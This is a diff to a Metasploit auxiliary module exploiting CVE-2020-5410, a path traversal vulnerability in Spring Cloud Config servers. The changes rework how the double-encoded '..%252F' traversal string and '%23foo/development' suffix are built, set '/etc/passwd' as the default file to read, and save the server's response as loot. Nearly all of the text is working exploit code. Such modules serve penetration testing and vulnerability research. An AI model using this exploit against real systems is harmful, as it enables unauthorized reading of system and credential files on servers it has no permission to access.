@@ -20,7 +20,8 @@ class MetasploitModule < Msf::Auxiliary
       'References'  =>
         [
           ['CVE', '2020-5410'],
-          ['URL', 'https://tanzu.vmware.com/security/cve-2020-5410']
+          ['URL', 'https://tanzu.vmware.com/security/cve-2020-5410'],
+          ['URL', 'https://xz.aliyun.com/t/7877']
         ],
       'Author'      =>
         [
@@ -36,19 +37,21 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(8888),
         OptString.new('TARGETURI', [true, "The base path to Spring Cloud Config installation", '/']),
-        OptString.new('FILEPATH', [true, "The path to the file to read", 'etc%252Fpasswd']),
+        OptString.new('FILEPATH', [true, "The path to the file to read", '/etc/passwd']),
         OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 11 ])
       ])
   end
 
   def run_host(ip)
-    filename = datastore['FILEPATH']
-    traversal = "#{"..%252F" * datastore['DEPTH']}#{filename}"
-    uri = "/#{traversal}%23foo/development"
+    traversal = '../' * datastore['DEPTH']
+    traversal = "#{traversal}#{datastore['FILEPATH']}"
+    traversal = traversal.gsub('/', '%252F')
+    traversal << '%23foo/development'
+    trav_uri = normalize_uri(target_uri.path, traversal)
 
     res = send_request_raw({
       'method' => 'GET',
-      'uri'    => uri
+      'uri'    => trav_uri
     })
 
     unless res && res.code == 200
@@ -56,13 +59,12 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    vprint_good("#{peer} - Downloaded #{res.body.length} bytes")
+    print_good("#{peer} - Downloaded #{res.body.length} bytes")
     path = store_loot(
       'springcloud.traversal',
       'text/plain',
       ip,
       res.body,
-      filename
     )
     print_good("File saved in: #{path}")
   end
